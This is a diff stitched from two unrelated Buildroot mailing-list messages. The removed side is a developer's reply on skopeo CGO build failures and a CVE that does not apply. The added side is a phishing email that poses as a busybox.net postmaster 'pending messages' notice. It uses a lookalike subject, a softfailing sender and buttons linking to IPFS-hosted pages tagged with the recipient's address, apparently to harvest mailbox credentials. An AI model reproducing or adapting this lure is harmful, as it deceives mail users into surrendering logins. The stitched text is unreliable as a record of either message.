@@ -1,90 +1,51 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
+Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id BB375C3DA61
-	for <buildroot@archiver.kernel.org>; Tue, 30 Jul 2024 04:23:57 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 9FDDFC3DA49
+	for <buildroot@archiver.kernel.org>; Tue, 30 Jul 2024 05:05:42 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp4.osuosl.org (Postfix) with ESMTP id EE39E40666;
-	Tue, 30 Jul 2024 04:23:56 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id 310EB608CD;
+	Tue, 30 Jul 2024 05:05:42 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id d1DW1zeXRRjJ; Tue, 30 Jul 2024 04:23:55 +0000 (UTC)
+Received: from smtp3.osuosl.org ([127.0.0.1])
+ by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id 2FOaEGGypRsl; Tue, 30 Jul 2024 05:05:41 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 40D4B40667
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 3A03B608CE
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp4.osuosl.org (Postfix) with ESMTP id 40D4B40667;
-	Tue, 30 Jul 2024 04:23:55 +0000 (UTC)
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by ash.osuosl.org (Postfix) with ESMTP id E9C991BF3A3
- for <buildroot@lists.busybox.net>; Tue, 30 Jul 2024 04:23:53 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id 3A03B608CE;
+	Tue, 30 Jul 2024 05:05:41 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id A6FB91BF38E
+ for <buildroot@lists.busybox.net>; Tue, 30 Jul 2024 05:05:39 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id E39E440667
- for <buildroot@lists.busybox.net>; Tue, 30 Jul 2024 04:23:53 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id 92A74810B1
+ for <buildroot@lists.busybox.net>; Tue, 30 Jul 2024 05:05:39 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id WhFYxenWPcb0 for <buildroot@lists.busybox.net>;
- Tue, 30 Jul 2024 04:23:52 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=80.12.126.239;
- helo=smtp-out.orange.com; envelope-from=yann.morin@orange.com;
- receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp4.osuosl.org EDFDC40666
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org EDFDC40666
-Received: from smtp-out.orange.com (smtp-out.orange.com [80.12.126.239])
- by smtp4.osuosl.org (Postfix) with ESMTPS id EDFDC40666
- for <buildroot@buildroot.org>; Tue, 30 Jul 2024 04:23:51 +0000 (UTC)
-Received: from unknown (HELO opfedv3rlp0g.nor.fr.ftgroup) ([x.x.x.x]) by
- smtp-out.orange.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384;
- 30 Jul 2024 06:23:49 +0200
-Received: from unknown (HELO OPE16NORMBX305.corporate.adroot.infra.ftgroup)
- ([x.x.x.x]) by opfedv3rlp0g.nor.fr.ftgroup with
- ESMTP/TLS/ECDHE-RSA-AES128-GCM-SHA256; 30 Jul 2024 06:23:49 +0200
-Received: from tl-lnx-nyma7486-2 [x.x.x.x] by
- OPE16NORMBX305.corporate.adroot.infra.ftgroup [x.x.x.x] with Microsoft SMTP
- Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
- 15.1.2507.39; Tue, 30 Jul 2024 06:23:47 +0200
-Received: by tl-lnx-nyma7486-2 (sSMTP sendmail emulation);
- Tue, 30 Jul 2024 06:23:47 +0200
-From: yann.morin@orange.com
-X-IronPort-AV: E=Sophos;i="6.09,247,1716242400"; d="scan'208";a="180644263"
-Date: Tue, 30 Jul 2024 06:23:47 +0200
-To: <buildroot@buildroot.org>
-Message-ID: <Zqhq01IIeT8DSmq6@tl-lnx-nyma7486-2>
-References: <c47a24$19l24k@smtp-ina.orange.com>
- <ZqeAk9SvzL44FV0+@tl-lnx-nyma7486-2>
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id Q45NhO1zSAPx for <buildroot@lists.busybox.net>;
+ Tue, 30 Jul 2024 05:05:38 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.91;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 61FFA810AE
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 61FFA810AE
+Received: from busybox.net (unknown [141.98.10.91])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 61FFA810AE
+ for <buildroot@busybox.net>; Tue, 30 Jul 2024 05:05:36 +0000 (UTC)
+From: Postmaster <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 30 Jul 2024 07:05:31 +0200
+Message-ID: <20240730070530.D065D8AE4B5A4964@busybox.net>
 MIME-Version: 1.0
-Content-Disposition: inline
-In-Reply-To: <ZqeAk9SvzL44FV0+@tl-lnx-nyma7486-2>
-X-Originating-IP: [10.115.27.53]
-X-ClientProxiedBy: OPE16NORMBX104.corporate.adroot.infra.ftgroup (10.115.26.5)
- To OPE16NORMBX305.corporate.adroot.infra.ftgroup
- (10.115.27.10)
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=orange.com; i=@orange.com; q=dns/txt; s=orange002;
- t=1722313432; x=1753849432;
- h=date:to:cc:subject:message-id:references:mime-version:
- in-reply-to:content-transfer-encoding:from;
- bh=Sl8gpY1MJ/KNdG4meClIy1D/oc1xYQS+VY2wiGLxkSY=;
- b=hsqAijuFt2LQ3R/+bgKAw4Lt0fwx7cC/zCPW3UinRzcKkEZYFbk1Ooti
- rYr9RIYISeHpMNxa8uWe2/ae/9/Nj1Tw1cSQflpcEChrpnNYC9GiPpSOY
- VjFfXBsyPTrK/Wd1GfnVKFA31mvw4UsOfCyuwqoitiBFc/jMkRUU5UA1v
- 6IkA2WVimz5DioV6593A3Mxjf2Pubcsua0nRWo+GbeRqU8b/VYMVS8O8k
- 4/tafBhQ4fLwG/FC9mZMO6jrvcGB7LlFMHY4aRRykWaDSlYX80lW4jwDO
- Z4RdB/EyZg9WDu4jAbLic2zmD5phXTIgpwwUTgO1OPRZdDWgq1Gi6mVl5
- Q==;
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dmarc=pass (p=none dis=none)
- header.from=orange.com
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dkim=pass (2048-bit key,
- unprotected) header.d=orange.com header.i=@orange.com header.a=rsa-sha256
- header.s=orange002 header.b=hsqAijuF
-Subject: Re: [Buildroot] [autobuild.buildroot.net] Your daily results for
- 2024-07-28
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] =?utf-8?q?Undeliverable=3A_You_have_=288=29_pending_?=
+ =?utf-8?b?bWVzc8mRZ2Vz?=
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -96,128 +57,176 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Christian Stewart <christian@aperture.us>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============2056923292546124231=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Christian, All,
+--===============2056923292546124231==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-On 2024-07-29 13:44 +0200, MORIN Yann INNOV/IT-S spake thusly:
-> On 2024-07-29 04:55 -0000, Thomas Petazzoni spake thusly:
-> >    mips64    |       host-skopeo-1.13.3       | http://autobuild.buildroot.net/results/9dacb15da7dcf4fb97cd2eaf17c5cb3c88290390
-> >   mips64el   |       host-skopeo-1.13.3       | http://autobuild.buildroot.net/results/e4dbb5c7eb1c952718c2efa9bcd2211681ac950a
-> The root cause for these build failures is that the gpgme wrapper in go
-> needs CGO support, but the failing configurations both disable CGO,
-> because the target architecture does not support CGO linking support.
-> 
-> We handle CGO in a slightly convoluted manner:
-> 
-> * if the go compiler supports the tqrget
->   - if there is no CGO linking, then we set HOST_GO_CGO_ENABLED=1
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div id=3D":92b" style=3D'color: rgb(34, 34, 34); text-transform: none; tex=
+t-indent: 0px; letter-spacing: normal; font-family: "Google Sans", Roboto, =
+RobotoDraft, Helvetica, Arial, sans-serif; font-size: medium; font-style: n=
+ormal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2=
+; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;'><div class=3D"qQVYZb"><br></div><=
+div class=3D"lQs8Hd" jscontroller=3D"i3Ohde" jsaction=3D"SN3rtf:rcuQ6b"></d=
+iv><div class=3D"btm"></div></div>
+<div style=3D'color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: "Google Sans", Roboto, RobotoDraft,=
+ Helvetica, Arial, sans-serif; font-size: medium; font-style: normal; font-=
+weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;=
+ background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thic=
+kness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;'><div class=3D"aHl" style=3D"margin-left: -=
+38px;"></div><div tabindex=3D"-1" id=3D":91y"></div>
+<div class=3D"ii gt" id=3D":929" style=3D"margin: 8px 0px 0px; padding: 0px=
+; font-size: 0.87rem; position: relative; direction: ltr;" jslog=3D"20277; =
+u014N:xr6bB; 1:WyIjdGhyZWFkLWY6MTc3ODU4Mjg5MTg5ODM1MTY4MSIsbnVsbCxudWxsLG51=
+bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsW11d; 4:WyI=
+jbXNnLWY6MTc3ODU4Mjg5MTg5ODM1MTY4MSIsbnVsbCxbXSxudWxsLG51bGwsbnVsbCxudWxsLG=
+51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxbXSxbXSxbXV0.">
+<div class=3D"a3s aiL " id=3D":92a" style=3D"font: small/1.5 Arial, Helveti=
+ca, sans-serif; width: 603px; height: 606px; overflow: hidden; font-size-ad=
+just: none; font-stretch: normal;"><u></u><div style=3D"margin: 0.4em;">
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; border-top-color: currentColor; border-top-width: 0px; border-top-style: =
+none; white-space: normal; box-sizing: border-box; background-color: rgb(24=
+4, 248, 245); font-variant-ligatures: normal; font-variant-caps: normal; te=
+xt-decoration-style: initial;=20
+text-decoration-color: initial;"><div style=3D"width: 593px; height: 43px; =
+padding-top: 5px; padding-right: 5px; padding-bottom: 5px; margin-left: 18p=
+x; border-top-color: currentColor; border-top-width: 0px; border-top-style:=
+ none; float: left; box-sizing: border-box;"><span style=3D"box-sizing: bor=
+der-box;"><font size=3D"2"><span style=3D"box-sizing: border-box;"><font si=
+ze=3D"2">Message generated from<span>&nbsp;</span>
+<a style=3D"color: rgb(17, 85, 204);" href=3D"https://busybox.net" target=
+=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://m=
+edi-cont.hu&amp;source=3Dgmail&amp;ust=3D1696329870830000&amp;usg=3DAOvVaw0=
+fBxS8iT8to0LhSccEB9L8">busybox.net</a>&nbsp;source.</font></span><font size=
+=3D"2"></font><font size=3D"2"><span style=3D"box-sizing: border-box;"></sp=
+an></font></font><font size=3D"2"><span style=3D"box-sizing: border-box;">
+<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
+ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(244, 248, 245);'><br></div></span></font></span><font size=
+=3D"2"></font><span style=3D"box-sizing: border-box;"></span>
+<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
+ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(244, 248, 245);'><br></div></div><div style=3D"box-sizing: b=
+order-box;"><div style=3D"width: 5px; height: 30px; border-top-color: curre=
+ntColor; border-top-width: 0px; border-top-style: none; box-sizing: border-=
+box; background-color: rgb(86, 166, 89);"></div></div>
+</div><div style=3D"text-align: left; color: rgb(44, 54, 58); text-transfor=
+m: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto, san=
+s-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacin=
+g: 0px; white-space: normal; box-sizing: border-box; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+text-decoration-style: initial; text-decoration-color: initial;"><br></div>=
 
-Of course, this is the other way around: if there is CGO linking, then
-we set HOST_GO_CGO_ENABLED=1.
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; background-color: rgb(255, 2=
+55, 255); font-variant-ligatures: normal; font-variant-caps: normal; text-d=
+ecoration-style: initial; text-decoration-color: initial;">&nbsp;</div>
+<table style=3D"width: 629px; text-align: left; color: rgb(44, 54, 58); tex=
+t-transform: none; letter-spacing: normal; font-family: calibri; font-size:=
+ 16px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; box-sizing: border-box; background-col=
+or: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: =
+normal; text-decoration-style: initial; text-decoration-color: initial;" bo=
+rder=3D"0"><tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;"><td align=3D"left" style=3D"margin: 0=
+px; box-sizing: border-box;"><table style=3D"width: 627px; border-collapse:=
+ collapse; min-width: 600px; box-sizing: border-box;" border=3D"0" cellspac=
+ing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr al=
+ign=3D"center" style=3D"box-sizing: border-box;"><td style=3D"margin: 0px; =
+box-sizing: border-box;">
+<table style=3D"border-collapse: collapse; max-width: 600px; box-sizing: bo=
+rder-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D=
+"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=
+=3D"margin: 0px; box-sizing: border-box;"><table style=3D"width: 513px; bor=
+der-collapse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=
+=3D"0" cellpadding=3D"0"></table></td></tr><tr style=3D"box-sizing: border-=
+box;"><td style=3D"margin: 0px; box-sizing: border-box;">
+<div style=3D"padding: 22px 25.64px 30px; text-align: center; font-family: =
+Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 25px; border-top-c=
+olor: currentColor; border-bottom-color: rgb(201, 201, 201); border-top-wid=
+th: 0px; border-bottom-width: thin; border-top-style: none; border-bottom-s=
+tyle: solid; box-sizing: border-box;">Notification of pending&nbsp;8 messag=
+es.<br style=3D"box-sizing: border-box;"></div></td></tr><tr style=3D"box-s=
+izing: border-box;">
+<td style=3D"margin: 0px; box-sizing: border-box;"><div style=3D"border-top=
+-color: currentColor; border-top-width: 0px; border-top-style: none; box-si=
+zing: border-box;">&nbsp;</div><div style=3D"box-sizing: border-box;">&nbsp=
+;</div><font size=3D"1"><font size=3D"2">Some messages are restrained from =
+delivering to <u><font color=3D"#0000ff"><a style=3D"color: rgb(17, 85, 204=
+);" href=3D"mailto:buildroot@busybox.net" target=3D"_blank">buildroot@busyb=
+ox.net</a></font></u><font style=3D"box-sizing: border-box;"><br><br></font=
+></font></font>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+<font size=3D"2">Due to low bandwidth we notify you to take prompt actions<=
+/font></p>
+<a style=3D"background: rgb(36, 107, 193); margin: 2px; padding: 10px; outl=
+ine: 0px; border: thick currentColor; border-image: none; color: rgb(255, 2=
+55, 255); text-decoration: none; float: left; display: block; box-sizing: b=
+order-box;" href=3D"https://ipfs.io/ipfs/bafybeibgx66amahxq7ehesld4jaomoqvz=
+cgtp7kytv6iqfkernlq7vq65u#buildroot@busybox.net" target=3D"_blank" rel=3D"n=
+oreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/QmZQvyxDWr4LkNi2rmTUucThARVM2DnAresq6upiC3z4Po?filename%3Dinde=
+x-update.html%23info@medi-cont.hu&amp;source=3Dgmail&amp;ust=3D169632987083=
+0000&amp;usg=3DAOvVaw0ibFTANhQzj-VXz7vNmqeY" data-saferedirectreason=3D"1">=
+<font size=3D"3">Release Messages</font></a>
+<a style=3D"background: rgb(179, 179, 179); margin: 2px; padding: 10px; out=
+line: 0px; border: thick currentColor; border-image: none; color: rgb(255, =
+255, 255); text-decoration: none; float: left; display: block; box-sizing: =
+border-box;" href=3D"https://ipfs.io/ipfs/bafybeibgx66amahxq7ehesld4jaomoqv=
+zcgtp7kytv6iqfkernlq7vq65u#buildroot@busybox.net" target=3D"_blank" rel=3D"=
+noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/QmZQvyxDWr4LkNi2rmTUucThARVM2DnAresq6upiC3z4Po?filename%3Dinde=
+x-update.html%23info@medi-cont.hu&amp;source=3Dgmail&amp;ust=3D169632987083=
+0000&amp;usg=3DAOvVaw0ibFTANhQzj-VXz7vNmqeY" data-saferedirectreason=3D"1">=
+<font size=3D"3">Review Here</font></a><p style=3D"margin-top: 0px; margin-=
+bottom: 1rem; box-sizing: border-box;">&nbsp;</p><p style=3D"margin-top: 0p=
+x; margin-bottom: 1rem; box-sizing: border-box;"></p>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: bor=
+der-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing:=
+ border-box;"></p><h5 style=3D"line-height: 1.2; font-size: 1.25rem; font-w=
+eight: 500; margin-top: 0px; margin-bottom: 0.5rem; box-sizing: border-box;=
+"><font size=3D"1"><font size=3D"2"><font size=3D"3"><font size=3D"2">Messa=
+ge should be moved to inbox.&nbsp;<span>&nbsp;</span>
+<u style=3D"box-sizing: border-box;"><a href=3D"https://cloudflare-ipfs.com=
+/ipfs/QmNzHfbXaVaWHtrNL3UPmefnVoavavy1gvzmwSDzrWKWwA?filename=3DQmNzHfbXaVa=
+WHtrNL3UPmefnVoavavy1gvzmwSDzrWKWwA#buildroot@busybox.net">Mail.</a></u></f=
+ont></font></font></font></h5></td></tr></tbody></table></td></tr></tbody><=
+/table></td></tr></tbody></table></div></div></div></div></body></html>
 
-Regards,
-Yann E. MORIN.
+--===============2056923292546124231==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
->   - otherwise we set HOST_GO_CGO_ENABLED=0
-> * if the go compiler does not support the target, then we set
->   HOST_GO_CGO_ENABLED=1
-> 
-> And then we build go packages, target or host variants alike, with:
->     CGO_ENABLED=$(HOST_GO_CGO_ENABLED)
-> 
-> Furthermore, HOST_GO_CGO_ENABLED is also used when building go-src.
-> The same go compiler is then used to build either target or host
-> packages.
-> 
-> AFAICS, there is no way to tell the go compiler to build with CGO
-> linking for the host but without for the target; its an all-or-nothing
-> situation, and thus the limitation of the target do leak onto the host
-> support.
-> 
-> There is a Kconfig knob that drives whether CGO is enabled, which is
-> BR2_PACKAGE_HOST_GO_TARGET_CGO_LINKING_SUPPORTS. However, as its name
-> suggests, it is for the target. And when go does not even support the
-> target, that will not be enabled either.
-> 
-> So, what I see as a solution, is two-fold:
-> 
->  1. introduce BR2_PACKAGE_HOST_GO_HOST_CGO_LINKING_SUPPORTS, defined as
->     follows:
-> 
->         config BR2_PACKAGE_HOST_GO_HOST_CGO_LINKING_SUPPORTS
->             bool
->             default y if BR2_PACKAGE_HOST_GO_TARGET_CGO_LINKING_SUPPORTS
->             default y if !BR2_PACKAGE_HOST_GO_TARGET_ARCH_SUPPORTS
-> 
->  2. make skopeo depend on that new symbol
-> 
-> Thoughts?
-> 
-> > -------------------------------+----------+----------------------------------------------+--------------+--------------
-> > skopeo |  DISTRO  | https://release-monitoring.org/project/09216 | 1.13.3       | 1.15.2      
-> 
-> I'll see at updating skopeo as time permits in the week...
-> 
-> > skopeo | CVE-2019-10214   | https://security-tracker.debian.org/tracker/CVE-2019-10214  
-> 
-> That CVE applies to containers/image, and is matched for un-versioned
-> skopeo (notice the dash '-' in the CPE ID):
-> 
->     https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:skopeo_project:skopeo:-:*:*:*:*:*:*:*
-> 
-> and does not apply to any versioned skopeo (any and 1.13.3 for example;
-> notice the star '*' or the version instead of the dash in the CPE ID):
-> 
->     https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:skopeo_project:skopeo:*:*:*:*:*:*:*:*
->     https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:skopeo_project:skopeo:1.13.3:*:*:*:*:*:*:*
-> 
-> This was fixed in containers/image in upstream commit a3d69a4a (Use the
-> same HTTP client for contacting the bearer token server and the
-> registry, 2019-08-01) which has been released in containers/image v3.0.0.
-> skopeo 1.13.3 vendors containers/image v5.26.2, so the CVE does not
-> apply.
-> 
-> So, not sure what the best way of action would be...
-> 
-> Regards,
-> Yann E. MORIN.
-> 
-> -- 
->                                         ____________
-> .-----------------.--------------------:       _    :------------------.
-> |  Yann E. MORIN  | Real-Time Embedded |    __/ )   | /"\ ASCII RIBBON |
-> |                 | Software  Designer |  _/ - /'   | \ / CAMPAIGN     |
-> | +33 638.411.245 '--------------------: (_    `--, |  X  AGAINST      |
-> | yann.morin (at) orange.com           |_="    ,--' | / \ HTML MAIL    |
-> '--------------------------------------:______/_____:------------------'
-> 
-
--- 
-                                        ____________
-.-----------------.--------------------:       _    :------------------.
-|  Yann E. MORIN  | Real-Time Embedded |    __/ )   | /"\ ASCII RIBBON |
-|                 | Software  Designer |  _/ - /'   | \ / CAMPAIGN     |
-| +33 638.411.245 '--------------------: (_    `--, |  X  AGAINST      |
-| yann.morin (at) orange.com           |_="    ,--' | / \ HTML MAIL    |
-'--------------------------------------:______/_____:------------------'
-
-____________________________________________________________________________________________________________
-Ce message et ses pieces jointes peuvent contenir des informations confidentielles ou privilegiees et ne doivent donc
-pas etre diffuses, exploites ou copies sans autorisation. Si vous avez recu ce message par erreur, veuillez le signaler
-a l'expediteur et le detruire ainsi que les pieces jointes. Les messages electroniques etant susceptibles d'alteration,
-Orange decline toute responsabilite si ce message a ete altere, deforme ou falsifie. Merci.
-
-This message and its attachments may contain confidential or privileged information that may be protected by law;
-they should not be distributed, used or copied without authorisation.
-If you have received this email in error, please notify the sender and delete this message and its attachments.
-As emails may be altered, Orange is not liable for messages that have been modified, changed or falsified.
-Thank you.
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============2056923292546124231==--
